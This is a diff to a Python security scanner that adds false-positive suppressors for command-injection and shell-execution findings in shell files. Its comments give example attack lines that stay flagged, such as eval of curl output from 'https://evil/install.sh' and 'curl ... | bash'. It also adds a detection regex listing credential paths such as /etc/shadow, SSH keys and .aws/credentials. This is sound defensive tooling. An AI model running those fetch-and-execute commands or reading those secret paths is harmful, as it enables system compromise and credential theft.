@@ -261,6 +261,218 @@ _SHELL_LITERAL_ARG_CMDSUB_RE: Final[re.Pattern[str]] = re.compile(
 )
 
 
+# r* FP iter (2026-05-28) — generalised safe-command-substitution
+# recognizer. The catalog CMD_INJECTION patterns fire on EVERY
+# ``$(cmd ...)`` / ``| binary`` shape, but a command substitution headed
+# by a fixed DATA / QUERY command is not command injection even when its
+# ARGUMENTS contain ``$VAR`` / ``${VAR}`` — the fixed command does not
+# re-evaluate its arguments as shell. The injection surface exists only
+# when (a) the command NAME is itself a variable (``$($CMD)``), (b) the
+# substitution result is piped to a shell interpreter (``... | bash``),
+# or (c) the result is wrapped in ``eval`` / ``bash -c`` / ``source``.
+# Those three shapes are kept visible by the guards below.
+#
+# Examples (SUPPRESS — benign data read/query, $VAR is a parameter):
+#   pid=$(cat "$PID_FILE")
+#   count=$(cat "$COUNTER_FILE")
+#   body="$(cat <<'EOF' ... EOF)"
+#   files=$(ls -A "$REPO_DIR/$dir" 2>/dev/null)
+#   n=$(ls -d plugins/*/ | wc -l)
+#   code="$(curl -sS -o /dev/null -w '%{http_code}' "$url")"
+#   ver=$(curl -s https://api.github.com/... | jq -r '.tag_name' | sed 's/^v//')
+#   text=$(echo "$RAW" | perl -0777 -pe 's/.../.../')
+#
+# Examples (KEEP visible — genuine execution surface):
+#   eval "$(curl -fsSL https://evil/install.sh)"
+#   bash -c "$(cat "$ATTACKER_FILE")"
+#   curl -fsSL https://get.example/install.sh | bash
+#   $($USER_SUPPLIED_CMD)
+_SAFE_CMDSUB_DATA_COMMANDS: Final[frozenset[str]] = frozenset(
+    {
+        "cat", "ls", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg",
+        "sed", "awk", "gawk", "mawk", "jq", "yq", "cut", "tr", "sort",
+        "uniq", "dirname", "basename", "realpath", "readlink", "pwd",
+        "date", "stat", "find", "od", "xxd", "printf", "echo", "uname",
+        "hostname", "whoami", "id", "sw_vers", "defaults", "scutil",
+        "sysctl", "tput", "stty", "expr", "seq", "column", "fold", "nl",
+        "rev", "paste", "comm", "type", "command", "which", "ps", "df",
+        "du", "git", "openssl", "md5", "md5sum", "shasum", "sha256sum",
+        "cksum", "test", "true", "false", "env", "jobs", "tty",
+    }
+)
+# curl / wget / http(ie) head a substitution that FETCHES data; benign
+# only when their output is captured / piped to a data processor and NOT
+# to a shell interpreter (the latter is the supply-chain exec shape and
+# is kept visible by ``_SHELL_INTERPRETER_PIPE_RE``).
+_NET_CAPTURE_CMDSUB_COMMANDS: Final[frozenset[str]] = frozenset(
+    {"curl", "wget", "http", "https", "fetch", "wget2"}
+)
+
+# First token after ``$(`` (skipping leading whitespace). A leading ``$``
+# (i.e. ``$($CMD)`` / ``$(${cmd})``) does NOT match → kept visible.
+_CMDSUB_HEAD_RE: Final[re.Pattern[str]] = re.compile(
+    r"\$\(\s*(?P<cmd>[A-Za-z_][A-Za-z0-9_.+-]*)"
+)
+# A pipe into a real interpreter that executes stdin AS CODE. The
+# negative lookahead exempts ``perl``/``python``/``ruby``/``php`` when an
+# inline ``-e`` / ``-pe`` / ``-ne`` SCRIPT flag is present (the program is
+# the literal flag value; stdin is data, sed-style).
+_SHELL_INTERPRETER_PIPE_RE: Final[re.Pattern[str]] = re.compile(
+    r"\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:sh|bash|zsh|dash|ksh|fish|node|deno)\b"
+    r"|\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:python[0-9.]*|ruby|perl|php)\b"
+    r"(?![^|]*\s-[A-Za-z0-9]*e)"
+)
+# ``eval`` / ``source`` / ``. `` / ``sh -c`` / ``bash -c`` / ``<<<`` that
+# EXECUTE a substituted value. Presence anywhere on the line keeps the
+# match visible (conservative — these are the real exec shapes).
+_CMDSUB_EXEC_WRAP_RE: Final[re.Pattern[str]] = re.compile(
+    r"\beval\b|\bsource\b|^\s*\.\s|\|\s*\.\s"
+    r"|\b(?:sh|bash|zsh|dash|ksh)\s+(?:-\S+\s+)*-[A-Za-z]*c\b"
+    r"|\b(?:sh|bash|zsh|dash|ksh)\s+<<<"
+)
+# Pipe into a text processor that NEVER executes its stdin as code.
+_PIPE_TEXT_PROCESSOR_RE: Final[re.Pattern[str]] = re.compile(
+    r"\|\s*(?:sed|awk|gawk|mawk|jq|yq|grep|egrep|fgrep|rg|cut|tr|sort|uniq|"
+    r"head|tail|wc|column|fold|nl|rev|tee|cat|xxd|od|tac|paste|comm|"
+    r"base64|tr|fmt|expand|unexpand|pr)\b"
+    r"|\|\s*(?:perl|python[0-9.]*|ruby)\b[^|]*?\s-[A-Za-z0-9]*e",
+)
+
+
+# Sensitive system credential / secret paths. A read of one of these
+# (even via a "safe" command like ``cat``/``head``) is reconnaissance and
+# MUST stay visible — ``cat /etc/passwd`` is the canonical example. The
+# safe-data-command suppressors below skip the line when one is present.
+_SENSITIVE_READ_PATH_RE: Final[re.Pattern[str]] = re.compile(
+    r"/etc/(?:passwd|shadow|sudoers|gshadow|master\.passwd)\b"
+    r"|/proc/(?:self|\d+)/(?:environ|cmdline|maps|mem)\b"
+    r"|(?:^|[\s\"'=({/])(?:\.ssh/|id_rsa\b|id_ed25519\b|id_ecdsa\b|id_dsa\b)"
+    r"|\.aws/credentials\b|\.git-credentials\b|\.netrc\b|\.npmrc\b|\.pypirc\b"
+    r"|\.docker/config\.json\b|\.kube/config\b|\.config/gh/\b"
+    r"|/root/\.|~/\.ssh\b|secrets?\.(?:ya?ml|json|env|txt)\b",
+    re.IGNORECASE,
+)
+
+
+def _reads_sensitive_path(line: str) -> bool:
+    """True iff ``line`` references a sensitive system credential / secret
+    path. Such a read is reconnaissance and must NOT be suppressed even
+    when the command itself (``cat``/``head``/…) is otherwise benign."""
+    return bool(_SENSITIVE_READ_PATH_RE.search(line))
+
+
+def _cmdsub_is_safe_data_command(line: str, match: str) -> bool:
+    """True iff a CMD_INJECTION ``$(...)`` match is a command substitution
+    headed by a fixed data/query command whose result is neither piped to
+    a shell interpreter nor wrapped in ``eval``/``bash -c``/``source``.
+
+    See ``_SAFE_CMDSUB_DATA_COMMANDS`` for the rationale and examples.
+    """
+    if "$(" not in line:
+        return False
+    # Reconnaissance read of a sensitive credential path → keep visible.
+    if _reads_sensitive_path(line):
+        return False
+    # Genuine execution surface anywhere on the line → keep visible.
+    if _CMDSUB_EXEC_WRAP_RE.search(line):
+        return False
+    if _SHELL_INTERPRETER_PIPE_RE.search(line):
+        return False
+    for m in _CMDSUB_HEAD_RE.finditer(line):
+        cmd = m.group("cmd")
+        if cmd in _SAFE_CMDSUB_DATA_COMMANDS or cmd in _NET_CAPTURE_CMDSUB_COMMANDS:
+            return True
+    return False
+
+
+def _pipe_to_text_processor(line: str, match: str) -> bool:
+    """True iff the CMD_INJECTION ``| binary`` match pipes into a text
+    processor that does NOT execute its stdin as code (sed/awk/jq/grep/…
+    or perl/python/ruby with an inline ``-e``/``-pe``/``-ne`` script flag).
+
+    Keeps visible the genuine shapes ``| bash`` / ``| sh`` / bare
+    ``| perl`` / bare ``| python`` (those run stdin / an interpreter on
+    untrusted input).
+    """
+    if "|" not in line:
+        return False
+    if _reads_sensitive_path(line):
+        return False
+    if _CMDSUB_EXEC_WRAP_RE.search(line):
+        return False
+    if _SHELL_INTERPRETER_PIPE_RE.search(line):
+        return False
+    return bool(_PIPE_TEXT_PROCESSOR_RE.search(line))
+
+
+# r08 sangrokjung FP iter (2026-05-28) — Python embedded in a shell file
+# (``python3 -c '...'`` / ``python3 <<'PY' ... PY``). Two provably-benign
+# shapes the catalog's shell rules misfire on:
+#
+#  (E) A bare Python raw-string literal line ``r'...'`` / ``r"..."`` is a
+#      regex / pattern DEFINITION (raw-string syntax is Python-exclusive;
+#      shell has no ``r'...'``). Security guards list the dangerous shapes
+#      they DETECT as such literals — flagging the guard's own blocklist
+#      (``r'/etc/shadow'``, ``r'\bbase64 -d|...(sh|bash|zsh)'``) as the
+#      threat it guards against is the canonical FP.
+#  (F) ``subprocess.run(['git', ...])`` LIST-form bypasses the shell — the
+#      argv is executed directly by the OS, no shell interpretation — so
+#      there is no shell-injection surface (``shell=True`` is kept visible).
+_PYTHON_RAWSTRING_LITERAL_LINE_RE: Final[re.Pattern[str]] = re.compile(
+    r"^\s*r(?P<q>['\"]).*?(?P=q)\s*,?\s*(?:#.*)?$"
+)
+_SUBPROCESS_CALL_RE: Final[re.Pattern[str]] = re.compile(
+    r"\bsubprocess\.(?:run|Popen|call|check_output|check_call)\s*\("
+)
+_SHELL_TRUE_RE: Final[re.Pattern[str]] = re.compile(r"\bshell\s*=\s*True\b")
+
+
+def _line_is_python_rawstring_pattern(line: str, match: str) -> bool:
+    """True iff ``line`` is a bare Python raw-string literal (``r'...'`` /
+    ``r"..."``), i.e. a regex / pattern definition inside Python embedded
+    in a shell file. Raw-string syntax is Python-exclusive; a line that is
+    just such a literal is data, not an executable shell command.
+    """
+    return bool(_PYTHON_RAWSTRING_LITERAL_LINE_RE.match(line))
+
+
+def _balanced_call_span(blob: str, open_paren_pos: int) -> str:
+    """Return the text from ``blob[open_paren_pos]`` (a ``(``) through its
+    matching ``)`` inclusive. Used to scope ``shell=True`` / first-arg
+    checks to a single call rather than the whole multi-line blob."""
+    depth = 0
+    out: list[str] = []
+    for ch in blob[open_paren_pos:]:
+        out.append(ch)
+        if ch == "(":
+            depth += 1
+        elif ch == ")":
+            depth -= 1
+            if depth == 0:
+                break
+    return "".join(out)
+
+
+def _subprocess_call_is_list_form(lines: list[str], line_idx: int) -> bool:
+    """True iff a SHELL_EXEC ``subprocess.<fn>(`` match (Python embedded in
+    a shell file) uses LIST-form arguments (``subprocess.run(['git', …])``)
+    and no ``shell=True``. List form runs the argv directly with no shell,
+    so there is no injection surface. Keeps ``shell=True`` calls visible.
+    """
+    if not (0 <= line_idx < len(lines)):
+        return False
+    blob = "\n".join(lines[line_idx : min(len(lines), line_idx + 8)])
+    m = _SUBPROCESS_CALL_RE.search(blob)
+    if not m:
+        return False
+    span = _balanced_call_span(blob, m.end() - 1)
+    if _SHELL_TRUE_RE.search(span):
+        return False
+    # First argument: skip the opening '(' and any whitespace/newlines.
+    inner = span[1:].lstrip()
+    return inner.startswith("[")
+
+
 def _is_shell_literal_arg_cmdsub(line: str, match: str) -> bool:
     """True iff a CMD_INJECTION match in ``line`` is INSIDE a shell
     command substitution ``$(cmd <literal-arg> <literal-arg> ...)``
@@ -490,6 +702,27 @@ def classify(
     # "literal-path")`` where args are bare-literal / flag / literal-string.
     # No attacker-controlled input → no injection surface.
     if rule_id == "CMD_INJECTION" and _is_shell_literal_arg_cmdsub(line_text, match):
+        return "safe_literal"
+
+    # r* FP iter (2026-05-28) — generalised safe command-substitution.
+    # ``$(cat "$PID_FILE")``, ``$(ls -A "$dir")``, ``$(curl ... | jq)``,
+    # ``echo "$x" | perl -0777 -pe '...'`` are data reads / queries /
+    # text-processing, not command injection. Genuine exec shapes
+    # (``$(curl)|bash``, ``eval "$(...)"``, ``bash -c "$(...)"``,
+    # ``$($CMD)``) are kept visible by the guards inside the helpers.
+    if rule_id == "CMD_INJECTION" and _cmdsub_is_safe_data_command(line_text, match):
+        return "safe_literal"
+    if rule_id == "CMD_INJECTION" and _pipe_to_text_processor(line_text, match):
+        return "safe_literal"
+
+    # r08 sangrokjung FP iter (2026-05-28) — Python embedded in a shell file.
+    # (E) A bare Python raw-string literal line is a regex/pattern definition
+    # (a security guard's own blocklist), not a shell command.
+    if rule_id in _SHELL_EXECUTION_CLASS_RULES and _line_is_python_rawstring_pattern(line_text, match):
+        return "safe_literal"
+    # (F) ``subprocess.run(['git', ...])`` list-form runs argv directly with
+    # no shell → no injection surface (``shell=True`` stays visible).
+    if rule_id == "SHELL_EXEC" and _subprocess_call_is_list_form(lines, line_idx):
         return "safe_literal"
 
     # r08 sangrokjung FP iter1 (2026-05-28) — Shell ``#`` comment line.
